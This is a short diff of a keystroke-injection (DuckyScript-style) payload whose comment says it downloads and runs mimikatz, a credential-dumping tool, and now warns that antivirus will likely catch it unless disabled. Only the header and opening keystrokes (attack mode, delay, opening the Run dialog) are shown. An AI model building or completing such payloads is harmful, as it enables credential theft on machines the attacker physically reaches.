@@ -1,5 +1,5 @@
 REM Author Crashwire
-REM Description: Download and run's mimikatz
+REM Description: Download and run's mimikatz (MIMIKATZ WILL LIKELY TRIGGER AV IF NOT DISABLED)
 ATTACKMODE HID STORAGE
 DELAY 1000
 GUI r
